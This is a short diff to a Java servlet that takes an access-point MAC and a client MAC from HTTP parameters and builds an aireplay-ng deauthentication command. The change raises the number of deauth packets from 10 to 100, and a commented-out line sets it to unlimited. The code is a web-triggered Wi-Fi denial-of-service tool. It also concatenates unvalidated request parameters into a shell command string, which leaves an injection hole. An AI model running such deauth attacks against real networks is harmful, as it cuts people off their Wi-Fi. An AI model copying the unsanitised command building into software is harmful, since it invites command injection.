@@ -56,7 +56,7 @@ public class Control extends HttpServlet {
 			String uMAC = req.getParameter("uMAC");
 			String APMAC = req.getParameter("APMAC");
 
-			String command = "aireplay-ng -0 10 -a " + APMAC + " -c " + uMAC
+			String command = "aireplay-ng -0 100 -a " + APMAC + " -c " + uMAC
 					+ " wlan0";
 			//String command  = "aireplay-ng -0 0 -a "+APMAC+" -c "+uMAC+" wlan1";
 			Analysis.setStr(command);
